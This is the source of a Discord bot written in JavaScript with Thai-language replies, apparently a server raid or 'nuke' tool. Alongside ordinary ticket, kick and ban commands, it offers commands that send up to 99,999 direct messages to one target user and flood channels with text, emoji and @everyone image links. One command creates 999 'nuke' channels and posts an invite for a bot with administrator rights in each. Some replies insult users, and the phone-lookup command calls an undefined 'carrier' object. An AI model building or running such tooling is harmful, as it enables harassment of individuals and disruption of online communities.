import {
  Client,
  GatewayIntentBits,
  ChannelType,
  PermissionsBitField,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle
} from "discord.js";

import {
  joinVoiceChannel,
  createAudioPlayer,
  VoiceConnectionStatus,
  entersState,
  NoSubscriberBehavior
} from "@discordjs/voice";

import { parsePhoneNumberFromString } from "libphonenumber-js";
import "dotenv/config";

process.on("unhandledRejection", console.error);
process.on("uncaughtException", console.error);

// ================= CLIENT =================
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ],
});

// ================= !search =================
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith("!search")) return;

  const phoneInput = message.content.split(" ")[1];
  if (!phoneInput) {
    return message.reply("❌ ใช้แบบนี้: `!search 0812345678`");
  }

  try {
    // แปลงเบอร์ 0xxx → +66xxx
    let raw = phoneInput.trim();
    if (raw.startsWith("0")) {
      raw = "+66" + raw.slice(1);
    }

    const phone = parsePhoneNumberFromString(raw, "TH");
    if (!phone || !phone.isValid()) {
      return message.reply("❌ เบอร์ไม่ถูกต้อง");
    }

    const num = phone.number;

    let typeText = "อื่นๆ / VoIP";
    if (phone.getType() === "MOBILE") typeText = "มือถือ";
    if (phone.getType() === "FIXED_LINE") typeText = "บ้าน";

    const result = `
📞 เบอร์: ${phone.formatInternational()}
🌍 ประเทศ: ไทยย
📱 ประเภท: ${typeText}
📶 ค่าย: ${carrier.name_for_number(num, "th")}
⚠️ เบอร์อาจมีการย้ายค่าย
    `;

    message.reply("```" + result + "```");
  } catch (e) {
    console.error(e);
    message.reply("❌ รูปแบบเบอร์ผิด");
  }
});

// ================= CONFIG =================
const LOG_CHANNEL_ID = "1461588208675459217";
const BLOCKED_GUILD_ID = "146024011876123456";

// ================= ANGPAO =================
const ANGPAO_LINK = `
https://gift.truemoney.com/campaign/?v=067e13y095402q4tlg4032te7w204h4afk
https://gift.truemoney.com/campaign/?v=025e18y092902q4tlg6832te2w703h7afk
https://gift.truemoney.com/campaign/?v=030e89y038251q4tlg5921te6q703h9afk
https://gift.truemoney.com/campaign/?v=030e89y305392q4tlg1042te9w301h4afk
`;

// ================= RANDOM TEXT =================
const randomMessages = [
  "# @everyone https://cdn.discordapp.com/attachments/1456691382134509690/1456901560184340490/Screenshot_2026-01-03-13-45-59-016_com.android.chrome-edit.jpg?ex=698982cf&is=6988314f&hm=8f4137e508b4f94b9197fce1534a03bdc8ca8615765308f22b6149c6f8da4db1&",
  "# @everyone https://cdn.discordapp.com/attachments/1456691382134509690/1456901963517001790/Screenshot_2026-01-03-13-47-43-104_com.android.chrome-edit.jpg?ex=69898330&is=698831b0&hm=67f19e7f886c2d76931133a200ed622985cc65f7d9c5135428ee671d321b37db&",
];

// ================= ROOM NAMES =================
const roomNames = [
  "nuke",
];

// ================= TIME =================
function timeTH() {
  return new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" });
}

// ================= LOG =================
function logUse(i, extra = "") {
  if (!LOG_CHANNEL_ID) return;
  const ch = client.channels.cache.get(LOG_CHANNEL_ID);
  if (!ch) return;
  ch.send(
    `[\`${timeTH()}\`] ${i.user.tag} ใช้ /${i.commandName} ใน ${i.guild.name} ${extra}`
  ).catch(() => {});
}

// ================= READY =================
client.once("ready", () => {
  console.log(`${client.user.tag} is online.`);
});

// ================= INTERACTION =================
client.on("interactionCreate", async (interaction) => {
  try {
    if (!interaction.isChatInputCommand()) return;
    if (!interaction.guild) return;

    if (BLOCKED_GUILD_ID && interaction.guild.id === BLOCKED_GUILD_ID) {
      return interaction.reply({ content: "❌ เซิฟนี้ใช้ไม่ได้", ephemeral: true });
    }

    logUse(interaction);

    // ===== /angpao =====
    if (interaction.commandName === "angpao") {
      await interaction.reply({
        content: `🧧 อังเปา\n${ANGPAO_LINK}`,
      });
    }

    // ===== /dm =====
    if (interaction.commandName === "dm") {
      const target = interaction.options.getUser("target");
      const text = interaction.options.getString("text");
      const count = Math.min(interaction.options.getInteger("count") ?? 1, 99999); // 🔻 ลด loop

      await interaction.reply({ content: "ยิงDmเเล้ว", ephemeral: true });

      let ok = 0, fail = 0;
      for (let i = 0; i < count; i++) {
        await target.send(text).then(() => ok++).catch(() => fail++);
      }

      interaction.followUp({
        content: `ยิงเข้า ${ok} | พลาดวะ ${fail}`,
        ephemeral: true
      });
    }

    // ===== /spam =====
    if (interaction.commandName === "spam") {
      const text = interaction.options.getString("text");
      const count = Math.min(interaction.options.getInteger("count") ?? 1, 999999); // 🔻 ลด loop
      await interaction.reply({ content: "ลั่นละนะจ๊ะ", ephemeral: true });
      for (let i = 0; i < count; i++) {
        await interaction.channel.send(text).catch(()=>{});
      }
    }

    // ===== /emoji =====
    if (interaction.commandName === "emoji") {
      const emoji = interaction.options.getString("emoji");
      const count = Math.min(interaction.options.getInteger("count") ?? 1, 99999);
      const delay = Math.max(interaction.options.getInteger("delay") ?? 1, 10);

      await interaction.reply({ content: "🖕 ยิง emoji", ephemeral: true });
      for (let i = 0; i < count; i++) {
        await interaction.channel.send(emoji).catch(()=>{});
        await new Promise(r => setTimeout(r, delay));
      }
    }

    // ===== /join =====
    if (interaction.commandName === "join") {
      const vc = interaction.member.voice?.channel;
      if (!vc)
        return interaction.reply({ content: "❌ มึงเข้า VC ก่อนอันดับเเรกไอ้ควาย", ephemeral: true });

      const connection = joinVoiceChannel({
        channelId: vc.id,
        guildId: vc.guild.id,
        adapterCreator: vc.guild.voiceAdapterCreator,
        selfDeaf: false,
      });

      const player = createAudioPlayer({
        behaviors: { noSubscriber: NoSubscriberBehavior.Play }
      });

      connection.subscribe(player);

      connection.on(VoiceConnectionStatus.Disconnected, async () => {
        try {
          await Promise.race([
            entersState(connection, VoiceConnectionStatus.Signalling, 5_000),
            entersState(connection, VoiceConnectionStatus.Connecting, 5_000),
          ]);
        } catch {
          connection.destroy();
        }
      });

      interaction.reply({ content: " เข้าห้องแล้ว", ephemeral: true });
    }

    // ===== /tell_off =====
    if (interaction.commandName === "tell_off") {
      const count = Math.min(interaction.options.getInteger("count") ?? 5, 99999); // 🔻 ลดหนัก
      await interaction.reply({ content: `ส่ง ${count} ข้อความ`, ephemeral: true });

      for (let i = 0; i < count; i++) {
        await interaction.channel.send(
          randomMessages[Math.floor(Math.random() * randomMessages.length)]
        ).catch(()=>{});
      }
    }

    // ===== /kick =====
    if (interaction.commandName === "kick") {
      const target = interaction.options.getUser("target");
      const reason = interaction.options.getString("reason") ?? "No reason";
      const mem = interaction.guild.members.cache.get(target.id);

      if (!interaction.member.permissions.has(PermissionsBitField.Flags.KickMembers))
        return interaction.reply({ content:"นี่มันคำสั่งชั้นสูงไอ้ควาย", ephemeral:true });

      await mem.kick(reason).catch(()=>{});

      await interaction.reply({
        embeds: [
          new EmbedBuilder()
            .setTitle("👢 Kick")
            .setColor(0xffa500)
            .addFields(
              { name: "สมาชิก", value: `<@${target.id}>`, inline: true },
              { name: "โดย", value: `<@${interaction.user.id}>`, inline: true },
              { name: "เหตุผล", value: reason }
            )
            .setTimestamp()
        ]
      });
    }

  } catch (err) {
    console.error(err);
  }
});

  // ================= INTERACTION =================
client.on("interactionCreate", async (interaction) => {

  // ================= BUTTON =================
  if (interaction.isButton()) {

    if (interaction.customId === "vex") {
      try {
        const ch = await interaction.guild.channels.create({
          name: `ticket-${interaction.user.username}`,
          type: ChannelType.GuildText,
          permissionOverwrites: [
            {
              id: interaction.guild.roles.everyone.id,
              deny: [PermissionsBitField.Flags.ViewChannel],
            },
            {
              id: interaction.user.id,
              allow: [
                PermissionsBitField.Flags.ViewChannel,
                PermissionsBitField.Flags.SendMessages,
              ],
            },
          ],
        });

        await ch.send({
          content: "📩 Ticket เปิดแล้ว กดปุ่มด้านล่างเพื่อปิด",
          components: [{
            type: 1,
            components: [{
              type: 2,
              style: 4,
              label: "ปิด Ticket",
              customId: "close_ticket",
            }],
          }],
        });

        return interaction.reply({
          content: `เปิด ticket แล้ว: ${ch}`,
          ephemeral: true,
        });

      } catch (err) {
        console.error(err);
      }
      return;
    }

    if (interaction.customId === "close_ticket") {
      return interaction.channel.delete().catch(() => {});
    }

    return;
  }

  // ================= SLASH COMMAND =================
  if (!interaction.isChatInputCommand()) return;

  // ===== /toyou (แก้แล้ว ใช้ได้) =====
  if (interaction.commandName === "toyou") {
    const text = interaction.options.getString("text");

    if (!text) {
      return interaction.reply({
        content: "มึงต้องใส่ข้อความ",
        ephemeral: true,
      });
    }

    return interaction.reply({
      embeds: [
        {
          title: "📢 ฝากบอก",
          description: text,
          color: 0x5865F2,
          footer: { text: "VEXT ฝากบอก" },
          timestamp: new Date(),
        },
      ],
    });
  }

  // ===== /ban =====
  if (interaction.commandName === "ban") {
    const target = interaction.options.getUser("target");
    const reason = interaction.options.getString("reason") ?? "No reason";

    if (
      !interaction.member.permissions.has(
        PermissionsBitField.Flags.BanMembers
      )
    ) {
      return interaction.reply({
        content: "ไอ้ชั้นต่ำนี่มันคำสั่งชั้นสูง",
        ephemeral: true,
      });
    }

    await interaction.guild.members.ban(target, { reason }).catch(() => {});

    return interaction.reply({
      embeds: [{
        title: "Member Ban",
        color: 0xff0000,
        fields: [
          { name: "สมาชิก", value: `<@${target.id}>`, inline: true },
          { name: "ผู้ใช้คำสั่ง", value: `<@${interaction.user.id}>`, inline: true },
          { name: "เหตุผล", value: reason },
        ],
        timestamp: new Date(),
      }],
    });
  }

  // ===== /create_room (999 ห้อง) =====
  if (interaction.commandName === "create_room") {
    try {
      await interaction.reply({
        content: "กำลังสร้าง 999 ห้อง...",
        ephemeral: true,
      });

      const tasks = [];

      for (let i = 1; i <= 999; i++) {
        tasks.push(
          interaction.guild.channels.create({
            name: `nuke-${i}`,
            type: ChannelType.GuildText,
            permissionOverwrites: [
              {
                id: interaction.guild.roles.everyone.id,
                deny: [PermissionsBitField.Flags.ViewChannel],
              },
              {
                id: interaction.user.id,
                allow: [
                  PermissionsBitField.Flags.ViewChannel,
                  PermissionsBitField.Flags.SendMessages,
                ],
              },
            ],
          })
        );
      }

      const results = await Promise.allSettled(tasks);

      for (const res of results) {
        if (res.status === "fulfilled") {
          await res.value
            .send("@everyone ไม่เป็นไรนะ สร้างใหม่ได้ https://discord.com/oauth2/authorize?client_id=1461960244770115714&permissions=8&integration_type=0&scope=bot")
            .catch(() => {});
        }
      }

    } catch (err) {
      console.error(err);
    }
  }

});

// ================= READY =================
client.once("clientReady", () => {
  console.log(`Bot online as ${client.user.tag}`);
});

client.login(process.env.DISCORD_TOKEN);